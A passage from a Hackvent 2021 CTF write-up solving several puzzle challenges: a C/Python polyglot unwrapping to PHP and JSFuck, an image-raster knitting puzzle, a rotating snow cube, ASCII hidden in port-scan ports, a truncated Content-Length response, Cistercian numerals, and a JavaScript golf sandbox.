    #include <stdio.h>
    #define data const char p[17]
    #define u(x) x % 128 + 32
    #define bytearray(x) {u(547),u(139),u(432),u(345),u(596),u(840),u(847),u(718),u(669),u(547),u(345),u(596),u(840),u(847),u(718),u(31),0}
    #define b64decode
    #define discard int _
    #define from int main(void) {
    #define base64
    #define import
    #define hashlib
    #define sys
    from base64 import b64decode
    import hashlib
    import sys
    data = bytearray(b64decode("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"));
    discard = 1 // 3; """
        ;
        printf("%s", p);
        return 0;
    }
    /* """
    pwd = input().encode("utf-8")
    if hashlib.sha256(pwd).hexdigest() != "2cbdd00836863dbf7a24c10c67c3d9b7da272a6e2d0532689aebd2598fb7d53a" :
        sys.exit(1)
    
    for i in range(len(data)) :
        data[i] ^= pwd[i % len(pwd)]
    
    print(bytes(data).decode("utf-8"))
    # */
    

The C version prints out `p`, which is a byte array decoded.

I’ll compile it as C and get an executable I can run:

    
    
    $ cp code.py code.c
    $ gcc code.c -o code
    $ ./code
    C+Python=Cython?
    

That looks like a password. I’ll try giving that to the Python version, and
get the next layer:

    
    
    oxdf@parrot$ ./code | python code.py > code.php
    

#### PHP

The output is PHP code, but there’s one trick. For PHP to handle code as code,
it needs to be wrapped in `<?php ?>`. I’ll add that myself to get:

    
    
    <?php 
    $s = explode(",", "+[],[]+,!+[,[]],+!+,]+[,]]+,[]),])[,]+!,![],]+(,)[+,+(!,[+[,(!!,[+!,(![,[!+,!![,]]],)[!,[][,+[+,[(!,([],+[!,][(,]]),+([,[[],][[,[![,)[(,[([,]](,([!,((!,()[,])+,)(),]][,]((,](),](!,(([,()+,(+(,))[,)+[,+((,+![");
    $c = 'VQEH@KJ@U@DCMAGP@KSEH@iYXAGNFQEHBI@KJ@LBFOAGNT@U@DABFOAVQEH@KJ@U@DCMAGP@KSEH@\P@WCKVC@LBFQEHBI@DCMJ@LCMJ@LBFY^EH@KVQEH@KJ@U@DCMAGP@KSEH@FGRABI@KSEH@KSE[J@LCMAGRABFQEHDCMJ@LCHDANTMJ@LBTYXAGNFQEHBI@KJ@LBFOAGNTb[J@LCMAGRABFQEHDCMJ@LCEHBI@DCMJ@XAGNFQEHBI@KJ@LBFOAGNTLBE@FY^EHDCMAGRABI@KSEH@KSEHDC]_FGNFYXAGNFQEHBI@KJ@LBFOAGNT@U@DABFOAGNFOAVQEH@KJ@U@DCMAGP@KSEH@\P@WCKSEHDCjSEHDCMJ@U@DABFOAGNFY^EH@KSEHDC]_FGP@KAGXAGNFOAVQEH@KJ@U@DCMAGP@KSEH@\P@WCKVC@LBFOAGNFYXAGNFQEHBI@KJ@LBFOAGNT@U@DABFOAVQEH@KJ@U@DCMAGP@KSEH@\P@WCKJ@U@DCMJ@XAGNFQEHBI@KJ@LBFOAGNTLBE@FOAGP@cLBEBI@FeJ@LCWBFRABI@DCZ@DABFOAGNFP@EBI@DABI@EBI@DABI@DABFY^EHDCMAGRABI@KSEH@EDCZ@DABI@DCZ@DABI@DABI@KJ@U@DCMJ@U@DABFoDAP@KSEHBI@DCZ@DCWCqHDCMAGRABFOAGNFP@EBI@DABI@EBI@DABI@DABFOAGNFP@EBI@DABFRABI@DABI@DCMJ@LCZ@DABI@DCWCMJ@LCZ@DABI@EBI@KSEH@EDCWBFNFOAGNFP@EBI@EBI@DABI@DCZ@DCWBFOAGNFP@EBI@DABI@DABFRABI@KSEH@EBI@DABI@EBI@DABI@KSEH@EDCZ@DCZ@DABI@E@E@KSEH@EBI@DABI@EBI@DABI@KSEH@EDCZ@DABI@DCZ@DABI@DCMAGP@KVC@LBFOAGNFP@EBI@DABI@DABFP@KSEH@EBI@DABI@EBI@DABI@KSEH@EDCZ@DABI@DABFRABI@DABI@DCMJ@U@DABFdC@^HDANTMJ@LBFY^EHBI@KSEH@EBI@DABI@EBI@DABI@KSEH@EDCWBFRABI@DCZ@DABI@KZC@LCMJ@LCWBFNFRABI@DABI@DCMJ@LCWBFRABFRABI@DABFRABI@DCMJ@LCWBFNFRABI@DABI@DCMJ@LCWBFNFRABI@DABFRABI@DABFOAGNFRABI@DABFRABI@DABFOAGNFP@EBI@DABI@DABFRABI@DABFOAGNFRABI@DCZ@DCMJ@LCZ@DABI@DCWB\XAGRABI@KM@DAP@EDCpOAGNFOAVQEH@KJ@U@DCMAGP@KSEH@\P@WCKAGb[J@LCMAGRABFQEHDCMJ@LCEHBI@DCMJ@XAGNFQEHBI@KJ@LBFOAGNTLBE@FY^EHDCMAGRABI@KSEH@KSEHDC]_FGNFYXAGNFQEHBI@KJ@LBFOAGNT@U@DABFOAGNFOAVQEH@KJ@U@DCMAGP@KSEH@\P@WCKSEHDC[VC@LBFQEHDCr@aVQEH@KJ@U@DCMAGP@KSEH@FGRABI@KSE[J@LCMAGRABFQEHDCMJ@LCHDANT]_FGP@KJ@U@DABFOAGNFOAGP@KVC@LC][J@LCMAGRABFQEHDCMJ@LCEHBI@DCMJ@LCMJ@XAGNFQEHBI@KJ@LBFOAGNTLBE@FOAGP@FGP@WBTMJ@U@DABTl@DABEDCLBFQEHBI@K`FVCLBE@FOAGNTeJ@LCaVOAGRABI@KVC@LBFOAGNFOAGP@K`FVCLBE@FOAGRABI@KJ@U@DABTnGRABI@KSE[J@LCMAGRABFQEHDCMJ@LCHDANT]JE_\P@WCKVC@LBTm[J@LCMAGRABFQEHDCMJ@LC[VQEH@KJ@U@DCMAGP@KSEH@FGRABI@KSE[J@LCMAGRABFQEHDCMJ@LCHDANT]_FGP@KJ@U@DABFOAGNFOAGP@KVC@LC][J@LCMAGRABFQEHDCMJ@LCEHBI@DCMJ@LCMJ@XAGNFQEHBI@KJ@LBFOAGNTLBE@FOAGP@cOAGP@KSEHBI@DCMJ@LC]_FGNFOAGP@KVC@LBFQE@HdC@^HDANTMJ@LCMAGP@KJ@U@DC]JE_\P@WCKVQEH@KJ@U@DCMAGP@KSEH@FGRABI@KJ@U@DABTfDANTsKJWCa`FVCLBE@FOAGNFQEHDCMAGRABFdC@^HDANT][J@LCMAGRABFQEHDCMJ@LCEHBI@DCMAGRABI@cLBE@\fYXAGNFQEHBI@KJ@LBFOAGNT@U@DABFOAVQEH@KJ@U@DCMAGP@KSEH@\P@WCKVC@LBFQEHBI@DCMJ@LCMJ@LBFY^EH@KVQEH@KJ@U@DCMAGP@KSEH@FGRABI@KSEH@KSE[J@LCMAGRABFQEHDCMJ@LCHDANTMJ@LBTeAN\bJE_\P@WCKSEH@KJ@LBFQEHBI@K`FVCLBE@FYXAGNFQEHBI@KJ@LBFOAGNT@U@DABFQEHBI@DCkP@WCgGP@gY@aJ@LCMJ@XAGNFQEHBI@KJ@LBFOAGNTLBE@FY^EHDCMJ@LC][J@LCMAGRABFQEHDCMJ@LCEHBI@DCMJ@XAGNFQEHBI@KJ@LBFOAGNTLBE@FQEHBI@KSE[J@LCMAGRABFQEHDCMJ@LCHDANTMJ@LBTfDARABThh';
    $l = strlen($c);
    $r = "";
    for ($i = 0; $i < $l; ++$i) {
        $r = $r . $s[ord($c[$i]) - 64];
    }
    $l = strlen($r);
    for ($i = 0; $i < $l; $i += 80) {
        echo substr($r, $i, 80) . "\n";
    }
    ?>
    

Once I add that, I can run the script with `php`:

    
    
    oxdf@parrot$ php code.php > code.js
    

#### JSFuck

The output file isn’t obviously JavaScript:

    
    
    []+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]
    +[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!
    ![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]
    ]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+
    [])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!
    +[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[
    +[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])
    [+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![
    ...[snip]...
    

Luckily for me, I had run into JSFuck encoding a couple months ago in [Flare-
On](https://discord.com/channels/@me/788129631529992222/916640744935161966).
Knowing it’s JavaScript, I just ran it with Node:

    
    
    $ node code.js
    HV21{-T00-many-weird-L4NGU4GE5-}
    

I could drop it into [de4js](https://lelinhtinh.github.io/de4js/) and see what
it’s doing:

[![image-20211204134457168](https://0xdfimages.gitlab.io/img/image-20211204134457168.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20211204134457168.png)

Nothing fancy, just a `console.log` that prints the flag.

**Flag:`HV21{-T00-many-weird-L4NGU4GE5-}`**

## HV21.05

### Challenge

![hv21-ball05](https://0xdfimages.gitlab.io/img/hv21-ball05.png) | HV21.05 X-Mas Jumper  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO  
![fun](../img/hv-cat-fun.png)FUN  
Level: | easy  
Author: |  money   
  
> The elves have been getting into the festive spirit by making Christmas
> jumpers for themselves to wear in the workshop. They made one for Santa too,
> but it looks like they didn’t program the knitting machine correctly.

It included this image:

![](https://0xdfimages.gitlab.io/img/8dd64323-1056-409b-a328-22fe3d0104ef-16395794548572.jpg)

### Solution

The challenge looks kind of random, but perhaps like it’s on the wrong width.
I write a Python script to read in the blocks, either red or tan:

    
    
    #!/usr/bin/env python3
    
    import sys
    from PIL import Image
    
    x_num = 48
    x_off = 109
    x_width = (1098 - 104) / x_num
    y_num = 27
    y_off = 83
    y_width = (497 - 71) / y_num
    
    im = Image.open('8dd64323-1056-409b-a328-22fe3d0104ef.jpg')
    pix = im.load()
    res = []
    
    for y in range(y_num):
        for x in range(x_num):
            res.append(pix[int(x_width * x) + x_off, int(y_width * y) + y_off])
    

I used Gimp to measure the number of pixels to the first block (width and
height), as well as the distance from middle to middle of each block
(horizontal and vertical). That allows the program to step through the pattern
and capture it.

Some playing around in Gimp with the image showed that the most reliable way
to detect if the block was red or tan was to look at the second value in RGB.
I’ll print a block if it’s red, and space otherwise:

    
    
    for i,rgb in enumerate(res):
        if rgb[1] < 150:
            print("█", end='')
        else:
            print(" ", end='')
        if i > 0 and not i % int(sys.argv[1]):
            print()
    

`sys.argv[1]` is an int that says how wide the bits should be rastered on. 48
prints the original image:

![](https://0xdfimages.gitlab.io/img/image-20211209134039798.png)

I started stepping down, until I got to 37:

![](https://0xdfimages.gitlab.io/img/image-20211209134146791.png)

**Flag:`HV{Too_K3wL_F0R_YuLe!}`**

## HV21.06

### Challenge

![hv21-ball06](https://0xdfimages.gitlab.io/img/hv21-ball06.png) | HV21.06 Snow Cube  
---|---  
Categories: |  ![reverse_engineering](../img/hv-cat-reverse_engineering.png)REVERSE_ENGINEERING  
![fun](../img/hv-cat-fun.png)FUN  
Level: | easy  
Author: |  Dr. Nick   
  
> The ester bunny sent a gift to Santa - what is usually a crystal sphere
> seemed a bit too boring, so it’s a cube!
>
> The snow seems to be falling somewhat strangely, is it possible that there’s
> a message hidden somewhere?

There’s a docker I can spin up, which presents this webpage with a cube and
snow falling on a snowman. When I move the mouse around, the view point
rotates, but never too far off the front face:

![](https://0xdfimages.gitlab.io/img/hv21-snow2.gif)

### Solution

Looking at the Javascript for the page, the view angle is defined here:

    
    
    const canvas = document.getElementById("canvasSwonCube");
    const context = canvas.getContext("2d");
    let alpha = 0;
    let beta = 0;
    let s = false;
    
    let a = canvas.width;
    
    canvas.addEventListener('keydown', e => s = (e.key === 's'));
    canvas.addEventListener('keyup', e => s = true);
    canvas.addEventListener('mousemove', e => {
        var rect = e.target.getBoundingClientRect();
        alpha = s?((e.clientX-rect.left-a/2)*7/a):Math.sin(((e.clientX-rect.left-a/2)*7/a));
        beta = Math.sin(((e.clientY-rect.top-a/2)*7/a));
    });
    

It looks like if I hold down the `s` key, it should let me go all the way
around, rather than putting it into a sin function which limits the result to
-pi/2 to pi/2. I had little success with that on my laptop (on writing this up
later on my desktop with a mouse it worked great), so I just downloaded the
page and changed that section:

    
    
    const canvas = document.getElementById("canvasSwonCube");
    const context = canvas.getContext("2d");
    let alpha = Math.PI/2;
    let beta = 0;
    let s = false;
    
    let a = canvas.width;
    
    canvas.addEventListener('keydown', e => s = (e.key === 's'));
    canvas.addEventListener('keyup', e => s = true);
    canvas.addEventListener('mousemove', e => {
        var rect = e.target.getBoundingClientRect();
        //alpha = s?((e.clientX-rect.left-a/2)*7/a):Math.sin(((e.clientX-rect.left-a/2)*7/a));
        //beta = Math.sin(((e.clientY-rect.top-a/2)*7/a));
    });
    

Now the view angle isn’t dependent on the mouse, but rather just always from
the side:

![](https://0xdfimages.gitlab.io/img/image-20211209133337853.png)

Right away I’ll notice the letters in there, a fading H and a V coming into
view. I created this video of the entire thing, with the spaces between
letters speed up:

**Flag:`HV21{M3SSAGE_OUT_OF_FLAKES}`**

## HV21.07

### Challenge

![hv21-ball07](https://0xdfimages.gitlab.io/img/hv21-ball07.png) | HV21.07 Grinch's Portscan  
---|---  
Categories: |  ![network_security](../img/hv-cat-network_security.png)NETWORK_SECURITY  
![fun](../img/hv-cat-fun.png)FUN  
Level: | easy  
Author: |  wangibangi   
  
> The elves port-scanned grinch’s server and noticed something strange.
>
> There’s a secret message hidden in the packet capture, can you find it?

It includes [this
pcap](https://drive.google.com/u/1/uc?id=1UC3051UOvHFqbHLWztuufTDxHrxQZu6N&export=download).

### Solution

The PCAP has a ton of TCP conversations:

[![](https://0xdfimages.gitlab.io/img/image-20211209132559180.png)_Click for
full size
image_](https://0xdfimages.gitlab.io/img/image-20211209132559180.png)

That makes sense for a port scan. I used “Copy to csv” to get these into
Excel, and started looking at the number of packets in each conversation. Then
I removed the low ones as potentially uninteresting:

![](https://0xdfimages.gitlab.io/img/image-20211209132757863.png)

The remaining ports all looked like ASCII numbers:

![](https://0xdfimages.gitlab.io/img/image-20211209132829278.png)

So I created a column that was `=CHAR(port)`, and that gave the flag:

![](https://0xdfimages.gitlab.io/img/image-20211209132913091.png)

**Flag:`**HV21{c0nfuse_Portsc4nn3rs}'`**

## HV21.08

### Challenge

![hv21-ball08](https://0xdfimages.gitlab.io/img/hv21-ball08.png) | HV21.08 Flag Service  
---|---  
Categories: |  ![web_security](../img/hv-cat-web_security.png)WEB_SECURITY   
Level: | easy  
Author: |  nichtseb  
logical overflow  
  
> Santa has setup a web service for you to receive your flag for today.
> Unfortunately, the flag doesn’t seem to reach you.

There’s a docker that gives this page:

![image-20211215111126390](https://0xdfimages.gitlab.io/img/image-20211215111126390.png)

The background image changes on each visit.

### Solution

Looking at the source for the page, it appears to stop right in the middle:

    
    
    <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8" />
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono&display=swap" rel="stylesheet">
    
            <style>
            body{font-family: 'IBM Plex Mono', monospace;height: 100vh !important;background-image: url("https://source.unsplash.com/random");-webkit-background-size: cover;-moz-background-size: cover;-o-background-size: cover;background-size: cover;background-color:#131627;color:#fff;overflow:hidden;}
            ::selection{background-color:rgba(0, 0, 0, 0);}
            #flex-wrapper{position:absolute;top:0;bottom:0;right:0;left:0;-ms-flex-direction:row;-ms-flex-align:center;display:-webkit-flex;display:flex}#container{margin:auto; z-index: 10; padding:25px;}#container *{margin:0}h1{text-align:center;font-size:60px;color:#131627;text-shadow:0 0 5px #fff;opacity:0;-webkit-animation:fade-in 3s ease-in 0s forwards;-moz-animation:fade-in 3s ease-in 0s forwards;-o-animation:fade-in 3s ease-in 0s forwards;animation:fade-in 3s ease-in 0s forwards}h2{font-size:50px;text-shadow:0 0 5px orange;text-align:center;opacity:0;-webkit-animation:fade-in 3s ease-in .5s forwards;-moz-animation:fade-in 3s ease-in .5s forwards;-o-animation:fade-in 3s ease-in .5s forwards;animation:fade-in 3s ease-in .5s forwards}@-webkit-keyframes fade-in{from{opacity:0}to{opacity:1}}@-moz-keyframes fade-in{from{opacity:0}to{opacity:1}}@-o-keyframes fade-in{from{opacity:0}to{opacity:1}}@keyframes fade-in{from{opacity:0}to{opacity:1}}
            </style>
            <title>Flag Service</title>
        </head>
        <body>
            <div id="flex-wrapper">
            <div id="container">
                <h1>Thanks for using the Flag service.<br/> Your Flag is:</h1>
                <h2>
    

The issue is with the `Content-Length` response header. It’s coming back to
short.

For example, in `curl`:

    
    
    oxdf@parrot$ curl http://6e9dd25f-8fff-40af-aab5-4f1480a13d3a.rdocker.vuln.land/
    ...[snip]...
        <body>
            <div id="flex-wrapper">
            <div id="container">
                <h1>Thanks for using the Flag service.<br/> Your Flag is:</h1>
                <h2>
    

If I use the `--ignore-content-length` flag:

    
    
    $ curl --ignore-content-length http://6e9dd25f-8fff-40af-aab5-4f1480a13d3a.rdocker.vuln.land/
    ...[snip]...
        <body>
            <div id="flex-wrapper">
            <div id="container">
                <h1>Thanks for using the Flag service.<br/> Your Flag is:</h1>
                <h2>HV21{4lw4y5_c0un7_y0ur53lf_d0n7_7ru57_7h3_53rv3r}</h2>
                </div>
            </div>
            </div>
        </body>
    </html>
    

**Flag:`HV21{4lw4y5_c0un7_y0ur53lf_d0n7_7ru57_7h3_53rv3r}`**

### Digging Deeper

I’ll look in Wireshark at what happens both ways with `curl`. When I make the
request normally, the exchange looks like:

[![image-20211215170506145](https://0xdfimages.gitlab.io/img/image-20211215170506145.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20211215170506145.png)

The server sends back the first half of the response, with the `Content-
Length` header that says it’s done at packet 8. The client responds first with
a TCP ACK (packet 9), and then with a FIN/ACK (packet 10) to end the
connection. When the server then sends the rest, the client has already closed
down, and sends a RST (reset). The server tries to exit with a FIN/ACK, and
again, the client has already closed, so it responds with RST.

Running again with `--ignore-content-length`:

[![image-20211215170803313](https://0xdfimages.gitlab.io/img/image-20211215170803313.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20211215170803313.png)

This time the client just sends ACK to the first response, and waits. The
server then sends the rest (packet 10), and the client ACKs (11), and then the
server says it’s done with a FIN/ACK, and the client responds and both sides
shut down gracefully.

## HV21.09

### Challenge

![hv21-ball09](https://0xdfimages.gitlab.io/img/hv21-ball09.png) | HV21.09 Brother Santa  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO   
Level: | medium  
Author: |  brp64   
  
> Ever security minded, Santa is. So switched to a _prime_ encoding system he
> has, after contemplating for long.

There’s an image:

![](https://0xdfimages.gitlab.io/img/37673717-a564-47d1-b8a9-7750fe2a0600.png)

### Solution

#### Decode symbols

This is a monks code, or [Cistercian
numerals](https://en.wikipedia.org/wiki/Cistercian_numerals). Each will decode
four digits based on what’s coming up right (ones), up left (tens), down left
(hundreds) and down left (thousands). This image shows how:

![img](https://0xdfimages.gitlab.io/img/1280px-Cistercian_digits.png)

Using that key with the input, I’ll get these numbers:

    
    
    2314 
    6344
    6333
    4675
    2268
    3533
    0763
    5940
    1707
    7377
    4022
    4870
    7382
    6109
    0385
    4221
    

#### Decoding Numbers

Those numbers aren’t all ASCII characters, so that doesn’t work as a
translation. The prompt calls it a prime encoding… looking at the numbers,
while for 0-9999 it could use up to 14 bits, 0-8191 fits in 13, which handles
all of the numbers above. And 13 is prime.

I’ll convert each number to binary strings, making sure they each use 13-bits:

    
    
    >>> nums = [2314,6344,6333,4675,2268,3533,763,5940,1707,7377,4022,4870,7382,6109,385,4221]
    >>> [f'{x:013b}' for x in nums]
    ['0100100001010', '1100011001000', '1100010111101', '1001001000011', '0100011011100', '0110111001101', '0001011111011', '1011100110100', '0011010101011', '1110011010001', '0111110110110', '1001100000110', '1110011010110', '1011111011101', '0000110000001', '1000001111101']
    

Right away I notice that the high bits of the first word are 01001000 == 0x47
== “H”. I can split the rest that way, and it returns the flag:

    
    
    >>> bin_str = ''.join([f'{x:013b}' for x in nums])
    >>> ''.join([chr(int(bin_str[i:i+8],2)) for i in range(0, len(bin_str), 8)])
    'HV21{$4n74_w45_4_m0nk_t00}'
    

**Flag:`HV21{$4n74_w45_4_m0nk_t00}`**

## HV21.10

### Challenge

![hv21-ball10](https://0xdfimages.gitlab.io/img/hv21-ball10.png) | HV21.10 Christmas Trophy  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![programming](../img/hv-cat-programming.png)PROGRAMMING  
Level: | medium  
Author: |  nichtseb  
logical overflow  
  
> The elves thought Santa should relax a bit, so they’re inviting him to a
> round of golf. But the organizers must have understood, when they get there,
> what they get is keyboards instead of clubs!
>
> Write JS code that prints `Hackvent` without using characters from `a-z`,
> `A-Z`, `\`, `:` or `_`. The code should be at most 400 characters.

There’s a docker that returns the following page:

![image-20211215172732129](https://0xdfimages.gitlab.io/img/image-20211215172732129.png)

The source link gives the source for the site:

    
    
    const express = require('express');
    const path = require('path');
    const vm = require('vm');
    const hbs = require('hbs');
    
    const app = express();
    const flag = require('./flag');
    
    app.set('views', path.join(__dirname, 'views'));
    app.set('view engine', 'hbs');
    
    app.get('/', function (req, res) {
    
        let output = '';
        const code = req.query.code;
    
        if (code && code.length < 400 && /^[^a-zA-Z\\\:\_]*$/.test(code)) {
            try {
                const result = new vm.Script(code).runInNewContext(undefined, {timeout: 500});
    
                if (result === 'Hackvent') {
                    output = flag;
                } else {
                    output = "Bad result: " + result;
                }
            } catch (e) {
                console.log(e);
                output = 'Exception :(';
            }
        } else {
            output = "Bad code";
        }
    
        res.render('index', {output});
    });
    
    app.get('/source', function (req, res) {
